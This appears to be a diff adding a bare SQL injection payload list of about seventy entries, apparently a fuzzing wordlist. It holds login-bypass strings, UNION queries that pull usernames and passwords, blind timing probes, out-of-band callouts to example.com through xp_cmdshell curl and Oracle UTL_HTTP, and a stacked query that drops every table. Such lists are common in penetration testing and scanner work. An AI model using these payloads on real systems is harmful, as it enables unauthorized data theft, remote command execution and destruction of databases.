@@ -1,0 +1,73 @@
+' OR '1'='1
+' OR 'a'='a
+' OR '1'='1' --
+' OR '1'='1' /*
+' OR '1'='1'#
+' OR '1'='1' OR ''='
+' OR '1'='1' OR '1'='1
+' OR 'x'='x
+' OR '1'='1';--
+' OR '1'='1'#
+' OR '1'='1'/*
+' AND 1=CAST((CHR(60)||CHR(58)||CHR(41)) AS INT) --
+' AND 1=(SELECT COUNT(*) FROM tabname); --
+' AND 1=CONVERT(INT,(SELECT @@version)); --
+' UNION SELECT NULL, NULL, NULL --
+' UNION SELECT 1, @@version, 3 --
+' UNION SELECT table_name, column_name FROM information_schema.columns --
+' UNION SELECT username, password FROM users --
+' OR 1=1; WAITFOR DELAY '0:0:10' --
+' OR 1=1; SLEEP(10) --
+' OR 'a'='a' AND SLEEP(10) --
+' OR 1=1; exec master..xp_cmdshell 'ping -c 1 example.com' --
+' OR 1=1; exec master..xp_cmdshell 'nslookup example.com' --
+' OR 1=1; exec master..xp_cmdshell 'curl http://example.com' --
+' AND '1'='1
+' AND '1'='2
+' AND 'a'='a
+' AND 'a'='b
+' OR ' ' = '
+' OR ' ' = ' '
+' OR ' ' = ' '
+' OR 'a' = 'a
+' OR 1=1; --
+' OR 1=1; /* 
+' OR 1=1; #
+' OR 1=1; exec xp_cmdshell('ping example.com') --
+%27%20OR%20%271%27=%271
+%27%20OR%20%271%27=%271%20--%20
+%27%20OR%20%271%27=%271%20%23
+' OR (SELECT 1 WHERE 1=1) --
+' OR (SELECT 1 WHERE 1=2) --
+' AND (SELECT 1 WHERE 1=1) = 1 --
+' AND (SELECT 1 WHERE 1=2) = 1 --
+' AND 1=CONVERT(INT,(SELECT top 1 table_name from information_schema.tables)) --
+' AND 1=CONVERT(INT,(SELECT top 1 column_name from information_schema.columns where table_name='users')) --
+' AND 1=ASCII('a') --
+' AND 1=ASCII('b') --
+' OR 1=CONVERT(INT, 'text') --
+' OR 1=CONVERT(DATE, 'invalid date') --
+' AND 'random' = 'random
+' AND 'random' = 'random1
+' OR 1=1; ALTER DATABASE SET AUTO_SHRINK ON --
+' OR 1=1; DBCC CHECKDB --
+' OR 1=1; EXEC sp_msforeachtable 'DROP TABLE ?' --
+' OR 1=1; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; xp_cmdshell('ping example.com') --
+' OR 1=1; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; xp_cmdshell('nslookup example.com') --
+' OR 1=1; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; xp_cmdshell('curl http://example.com') --
+' OR '1'='1' WAITFOR DELAY '0:0:5' --
+' OR 'a'='a' WAITFOR DELAY '0:0:5' --
+' OR 1=CONVERT(INT, '0x123456') --
+' OR 1=CONVERT(INT, '0xABCDEF') --
+' AND 1=UTL_INADDR.get_host_address('example.com') --
+' AND 1=UTL_HTTP.request('http://example.com') --
+' AND 1=DBMS_PIPE.receive_message('a', 10) --
+' AND 1=DBMS_LOCK.sleep(10) --
+' AND 1=DBMS_ALERT.sleep(10) --
+' AND 1=DBMS_UTILITY.analyze_schema('SYS', 'COMPUTE') --
+' OR 1=DBMS_LOB.substr(TO_CLOB('A'), 1, 1) --
+' OR 1=DBMS_OUTPUT.put_line('SQL Injection') --
+' OR 1=DBMS_RANDOM.string('U', 10) --
+' OR 1=DBMS_SESSION.set_nls('LANGUAGE', 'AMERICAN') --
+' OR 1=DBMS_STATS.gather_table_stats('SYS', 'DUAL') --
+' OR 1=DBMS_SYSTEM.ksdwrt(2, 'SQL Injection') --
